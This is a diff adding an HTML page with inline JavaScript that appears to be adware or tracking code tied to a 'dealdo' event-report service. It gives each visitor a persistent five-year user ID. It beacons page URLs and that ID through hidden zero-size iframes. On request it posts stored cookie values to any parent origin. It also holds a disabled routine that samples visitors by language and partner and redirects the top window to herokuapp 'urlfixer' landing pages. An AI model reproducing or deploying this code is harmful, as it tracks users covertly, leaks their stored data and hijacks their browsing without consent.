@@ -1,0 +1,503 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" 
+    "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+
+		
+	</head>
+	<body >
+		<script type="text/javascript">
+			
+			var COOKIE_KEY = null;
+			
+			var getUrlHash = function(){
+				var indexOfHash = document.URL.indexOf("#");
+				return document.URL.substr(indexOfHash + 1);
+
+			};
+			var ronendebug;
+			var jsonToUrlParams = function(obj){
+				var d = obj;
+
+				var str = '';
+				var arr = new Array();
+				for(var key in d){
+				    
+				    arr.push( key + "=" + d[key] );
+
+				}
+				if(arr.length > 0){
+				    str += arr.pop(0);
+				    for(var index in arr){
+				        str+="&";
+				        str += arr[index];
+				    }
+				    
+
+				}
+				return str;
+
+			};
+			var getParamFromUrlHash = function(key){
+
+				var d = getUrlHash();
+				if(d!=""){
+					key = key.toLowerCase();
+					//d = d.toLowerCase();
+					d =d.match(new RegExp(key +"=(.*?)?(&|$)"));
+					if(d!== null && d.length > 0 ){
+						return d[1];
+					}
+				}
+				return "";
+
+			};
+
+			//console.log(getAllParamsFromUrlAsKeyValueJson());
+			var getPartner= function(){
+				return getParamFromUrlHash("partner");
+			};
+
+			var getPageUrl= function(){
+				var ret = getParamFromUrlHash("pageurl");
+				ret= ret.substr(0,240);
+				return ret;
+			};
+
+			var getReferrer = function(){
+				var ret = getParamFromUrlHash("referrer");
+				ret = decodeURIComponent(ret);
+				return ret;
+			};
+
+			var getChannel= function(){
+				return getParamFromUrlHash("channel");
+			};
+
+			var getCountry= function(){
+				return getParamFromUrlHash("country");
+			};
+
+			var getOpDom= function(){
+				return getParamFromUrlHash("opdom");
+			};
+
+			var getQuickBaseUrl= function(){
+				var ret = getParamFromUrlHash("quick");
+				ret = decodeURIComponent(ret);
+				return ret;
+			};
+			
+			var getTrinity = function(){
+				var ret = getParamFromUrlHash("trinity");
+				return ret;
+			};
+
+			var getHid = function(){
+				var ret = getParamFromUrlHash("hid");
+				return ret;
+			};
+
+			var getInstGrp = function(){
+				var ret = getParamFromUrlHash("instgrp");
+				return ret;
+			};
+
+			var getSampleSet = function(){
+				var ret = getParamFromUrlHash("sset");
+				return ret;
+			};
+
+			
+
+			var getMmth = function(){
+				var ret = getParamFromUrlHash("mmth");
+				return ret;
+			};
+
+			var runMmth = function(){
+				var mmthKey  ="mmth";
+				var d = getMmth();
+				var ret = false;
+				d === 'true'?
+					setCookie(mmthKey,'true'):
+					(d === 'false'?
+						setCookie(mmthKey,'false') :
+						(d === ''  && getCookie(mmthKey) === 'true'?
+							(parent.postMessage( mmthKey, "*") ,  ret = true):
+					 		(ret = true))
+					);
+				return ret;
+
+			}
+
+
+			//console.log(getPartner() , "  " , getChannel() , "   ", getOpDom());
+
+			var SEPERATOR = "time_stamp_";	
+			var setCookie = function(cname, cvalue, exdays) {
+				if(typeof exdays === "undefined"){
+					exdays = 1;
+				}
+			    var d = new Date();
+			    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+			    var expires = "expires="+d.toUTCString();
+			    var domain = "; domain=tlscdn.com";
+			    document.cookie = cname + "=" + cvalue + "; " + expires + domain;
+
+			    typeof localStorage !== "undefined" 
+			    	&& localStorage.setItem(cname, cvalue + SEPERATOR + d.getTime());
+			};
+
+			COOKIE_KEY = getOpDom() + getPartner();
+			COOKIE_HBID = "hbid";
+
+
+
+			var getCookie = function(cname) {
+				var ret = "";
+				if(typeof localStorage !== "undefined" ){
+					ret = localStorage.getItem(cname);
+				}
+				if(ret !== "" && ret!== null ){
+					ret = ret.split(SEPERATOR);
+					var revVal = ret[0];
+					if(ret.length > 0){
+						var retExpired = ret[ret.length - 1];
+						var now = +new Date();
+						if(now > parseInt(retExpired) ){
+							return "";
+						}
+						
+					}
+					return revVal;
+				}
+			    var name = cname + "=";
+			    var ca = document.cookie.split(';');
+			    for(var i=0; i<ca.length; i++) {
+			        var c = ca[i];
+			        while (c.charAt(0)==' ') c = c.substring(1);
+			        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+			    }
+			    return "";
+			};
+
+			
+
+			var shouldReportHeartBit = function(){
+				
+				var sset = getSampleSet();
+				var partner = getPartner();
+				if(sset=== "qa" || sset === "7"){
+					if(partner === "ironpf" || partner === "pfna" ){
+						return true;
+					}
+					
+				}
+
+				var cookieVal = "";
+				if(COOKIE_KEY !== "" &&  COOKIE_KEY !== "undefined"){
+					cookieVal = getCookie(COOKIE_KEY);
+				}
+				var ret = (cookieVal !== null &&  cookieVal !=="" )? false:true;
+				return ret;
+
+			};
+
+			
+
+			var getHbId= function(check){
+				if(typeof check !== "undefined" ){
+					if(check > 1){
+						return;
+					}else{
+						check++;
+					}
+					
+				}
+				var cookieVal = "";
+				cookieVal = getCookie(COOKIE_HBID);
+				if(cookieVal !== null &&  cookieVal !=="" ){
+					return cookieVal;
+				}else{
+
+					var guid = (function() {
+						  function s4() {
+						    return Math.floor((1 + Math.random()) * 0x10000)
+						               .toString(16)
+						               .substring(1);
+						  }
+						  return function() {
+						    return 'b' + s4() + s4()  + s4() + s4()  +
+						           s4() +  s4() + s4() + s4();
+						  };
+						})();
+
+					setCookie(COOKIE_HBID , guid() , 365*5);
+					var checkTemp = 0;
+					if(typeof check !== "undefined"){
+						checkTemp = check;
+					}
+					return getHbId(checkTemp);
+
+				}
+
+			};
+
+			function load(url, callback) {
+		        var xhr;
+		         
+		        if(typeof XMLHttpRequest !== 'undefined') xhr = new XMLHttpRequest();
+		        else {
+		            var versions = ["MSXML2.XmlHttp.5.0", 
+		                            "MSXML2.XmlHttp.4.0",
+		                            "MSXML2.XmlHttp.3.0", 
+		                            "MSXML2.XmlHttp.2.0",
+		                            "Microsoft.XmlHttp"]
+		 
+		             for(var i = 0, len = versions.length; i < len; i++) {
+		                try {
+		                    xhr = new ActiveXObject(versions[i]);
+		                    break;
+		                }
+		                catch(e){}
+		             } // end for
+		        }
+		         
+		        xhr.onreadystatechange = ensureReadiness;
+		         
+		        function ensureReadiness() {
+		            if(xhr.readyState < 4) {
+		                return;
+		            }
+		             
+		            if(xhr.status !== 200) {
+		                return;
+		            }
+		 
+		            // all is well  
+		            if(xhr.readyState === 4) {
+		                callback(xhr);
+		            }           
+		        }
+		         
+		        xhr.open('GET', url, true);
+		        xhr.send('');
+		    }
+
+			var buildUrlEvent = function(url , jsonUrlParams){
+				var str = "";
+				str += url + "?" + jsonToUrlParams(jsonUrlParams);
+				return str;
+			};
+
+			var reportEvent = function(src , callback){
+	
+	                    try {
+	                    var iframe = document.createElement("iframe");
+	                    iframe.style["top"] = "-10000px";
+	                    iframe.style["left"] = "-10000px";
+	                    iframe.style["position"] = "relative";
+	                    iframe.style["width"] = "0px";
+	                    iframe.style["height"] = "0px";
+	                    iframe.style["border"] = "none";
+	                    //iframe.style["display"] = "none";
+	                    iframe.width =1;
+	                    iframe.height =1;
+	                    iframe.src = src;
+	                    if(typeof callback !== "undefined" && callback !== "" && callback !== null){
+	                    	iframe.onload = callback;
+	                    }
+	                    document.body.appendChild(iframe);
+	
+	
+	                    } catch (E111) {
+	
+	                    }
+	
+	        };
+
+	        var reportHeartbit = function(){
+	        	var jsonUrlParams = {
+        								type:"althb",
+										partner: getPartner(),
+										channel: getChannel(),
+										opdom: getOpDom(),
+										uid:getHbId(),
+										pageurl:getPageUrl(),
+										cb:(+new Date() / 1E3 | 0) - (+new Date() / 1E3 | 0) % (60*60*24),
+										trinity:getTrinity(),
+										hid:getHid(),
+										sset:getSampleSet(),
+										instrp:getInstGrp()
+									};
+				var url = getQuickBaseUrl() + 'dealdo/event-report';
+				url = buildUrlEvent(url , jsonUrlParams);
+				reportEvent(url);
+
+
+	        };
+
+
+
+			var handleHeartBit = function(){
+				if(shouldReportHeartBit()){
+					
+					reportHeartbit();
+					var cval = +new Date();
+					setCookie(COOKIE_KEY , cval);
+				}else{
+					//console.log("should not report");
+				}
+			};
+			
+			
+			var getCookieParam = function(){
+				var ret = getParamFromUrlHash("cookie");
+				return ret;
+			};
+
+
+
+
+			
+
+	        var reportQuick = function(topic , extras , callback){
+	        	var jsonUrlParams = {
+        								type:"quick",
+        								topic:topic,
+        								pageurl:encodeURIComponent(getPageUrl()),
+										cb:Math.random()
+										
+									};
+				var url = "https://endall41-q.apollocdn.com/dealdo/event-report";
+				url = buildUrlEvent(url , jsonUrlParams);
+				var suffix = "";
+				if(typeof extras !== "undefined"){
+					suffix ="&" + extras;
+				}
+				
+				reportEvent(url + suffix , callback);
+
+
+	        };
+
+			var handleGmail = function(){
+					return;
+					var pageUrl = getPageUrl() ;
+					var partner = getPartner();
+					var referrer = getReferrer();
+					var pageUrlDecoded  = decodeURIComponent(pageUrl);
+					try{
+						var isDebug = pageUrl.indexOf("ddddebug13") !== -1;
+						if(!isDebug){
+							var lng = window.navigator.userLanguage || window.navigator.language;
+							// if(!(lng.indexOf("US") !== -1 ||  
+							// 	lng.indexOf("de")  !== -1 ||
+							// 	lng.indexOf("en")  !== -1 || 
+							// 	lng.indexOf("pt") !== -1 ) ) {
+							// 	return;
+							// }
+
+							if(lng.indexOf("he") !== -1 ) {
+								return;
+							}
+
+
+
+							if(typeof chrome === "undefined"){
+								return;
+							}
+
+						}
+						if(referrer !==""){
+
+							if(pageUrlDecoded.indexOf(referrer) === 0){
+								return;
+							}
+						}
+						if(pageUrlDecoded.indexOf("https") === 0){
+							return;
+						}
+						if(partner.indexOf('iron') === -1){
+							return;
+						}
+						var COOKIE_GMAIL = "cgml10";
+						var cookieVal = getCookie(COOKIE_GMAIL);
+						var shouldPostMessage = (cookieVal !== null &&  cookieVal !=="" )? false:true;
+						var oneOutOfN = parseInt(Math.random()*30)  == 5;
+						if((shouldPostMessage  && oneOutOfN ) || isDebug){
+							load('https://s.tlscdn.com/dealdo/sitetypo?cb=' + Math.random(), function(xhr) {
+							    if ("ok" === xhr.responseText){
+							    	
+									if(true){
+										//parent.postMessage("qwerasdf","*");
+										var templates = [
+										
+										"https://urlcorrectator.herokuapp.com/lp.html", 
+										"https://urlfixer2.herokuapp.com/lp.html"
+										
+										
+										
+										];
+										setCookie(COOKIE_GMAIL , COOKIE_GMAIL ,365);
+										var url = getQuickBaseUrl() + 'dealdo/event-report';
+										var cb = Math.random();
+										url = buildUrlEvent(url , {
+											type:"quick",
+											topic:"typopre15",
+											partner: getPartner(),
+											channel: getChannel(),
+											opdom: getOpDom(),
+											uid:getHbId(),
+											pageurl:getPageUrl(),
+											cb:cb,
+											trinity:getTrinity(),
+											hid:getHid(),
+											sset:getSampleSet()
+										
+										});
+										reportEvent(url);
+										var index = parseInt(Math.random()*100000)%(templates.length);
+										top.location.href=templates[index] + "?cb="+cb ;
+
+									}
+							    }
+							});
+
+						}
+						
+						
+					}catch(e){}	
+				};
+				
+
+
+			(function(){
+				var recieverPrefixCookieKey = "xbbccch";
+				var senderPrefixCookieKey = "xbbcccd";
+				var cookieParam = getCookieParam();
+
+				if(cookieParam != ""){
+					//reading cookies implemntation to other windows.
+					
+					parent.postMessage(senderPrefixCookieKey + getCookie(cookieParam) , "*");  				
+					return;
+
+				}
+				var shouldContinue = runMmth();
+				if(!shouldContinue){
+					return;
+				}
+				handleGmail();
+				handleHeartBit();
+				
+			})();
+
+
+
+		</script>
+
+	</body>
+</html>
